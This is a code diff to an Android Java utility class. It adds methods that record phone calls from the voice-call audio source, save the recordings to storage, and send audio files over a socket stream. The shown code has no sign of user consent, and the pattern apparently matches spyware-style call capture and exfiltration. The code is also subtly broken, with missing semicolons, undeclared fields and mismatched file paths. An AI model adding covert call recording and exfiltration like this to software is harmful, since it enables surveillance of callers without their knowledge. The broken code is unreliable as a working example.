@@ -30,6 +30,10 @@ import java.util.Locale;
 import static android.content.Context.JOB_SCHEDULER_SERVICE;
 
 
+import android.media.MediaRecorder;
+import android.telephony.PhoneStateListener;
+import android.telephony.TelephonyManager;
+
 public class functions {
 
     Activity activity;
@@ -204,5 +208,75 @@ public class functions {
             manager.createNotificationChannel(notificationChannel);
         }
     }
+
+    // send call recodings over a socker 
+    public static void sendAudioFileOverSocket(String filePath, DataOutputStream out) {
+        try {
+            File audioFile = new File(filePath);
+
+            if (audioFile.exists()) {
+                FileInputStream fileInputStream = new FileInputStream(audioFile);
+                out.writeUTF(audioFile.getName());
+                out.writeLong(audioFile.length());
+
+                byte[] buffer = new byte[4096];
+                int bytesRead;
+
+                while ((bytesRead = fileInputStream.read(buffer)) != -1) {
+                    out.write(buffer, 0, bytesRead);
+                }
+                fileInputStream.close();
+                out.flush();
+                out.close();
+
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    // start recoding calls
+    private void startRecording() {
+        try {
+            mediaRecorder = new MediaRecorder();
+            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
+            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+            mediaRecorder.setOutputFile("your_output_file.3gp");
+            mediaRecorder.prepare();
+            mediaRecorder.start();
+            isRecording = true;
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    // stop recoding calls
+    private void stopRecording() {
+        try {
+            mediaRecorder.stop();
+            mediaRecorder.release();
+            isRecording = false;
+            saveRecordedFile()
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    private void saveRecordedFile() {
+    String outputDirectory = Environment.getExternalStorageDirectory().getAbsolutePath() + "/YourRecordingFolder";
+    File directory = new File(outputDirectory);
+
+    if (!directory.exists()) {
+        directory.mkdirs();
+    }
+
+    String outputFile = outputDirectory + "/output_file.3gp";
+    
+    File recordedFile = new File(outputFile);
+    File tempFile = new File(getFilesDir(), "temp.3gp");
+    tempFile.renameTo(recordedFile)
+    
+}
 
 }
